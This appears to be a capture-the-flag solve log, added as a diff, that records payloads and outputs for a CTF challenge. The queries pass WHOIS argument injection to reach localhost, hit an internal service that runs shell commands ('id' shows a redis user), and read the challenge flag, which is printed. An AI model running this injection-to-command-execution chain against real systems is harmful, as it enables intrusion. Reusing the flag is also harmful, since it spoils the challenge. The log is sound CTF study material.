@@ -1,0 +1,32 @@
+Target: http://chal.thjcc.org:5000/
+
+1. WHOIS argument injection / loopback SSRF proof
+
+Query:
+  -h 127.0.0.1 -p 5000 test
+
+Output (excerpt):
+  HTTP/1.1 400 Bad Request
+  Invalid Request Line 'Invalid HTTP request line: 'test''
+
+2. Internal service identification
+
+Query:
+  -h 127.0.0.1 -p 31337 probe
+
+Output:
+  sh: 1: probe: not found
+
+Query:
+  -h 127.0.0.1 -p 31337 id
+
+Output:
+  uid=100(redis) gid=101(redis) groups=101(redis)
+
+3. Flag recovery
+
+Query:
+  -h 127.0.0.1 -p 31337 /flag
+
+Output:
+  THJCC{Wh0_15_wH015???WH0_15_wh0_15:D}
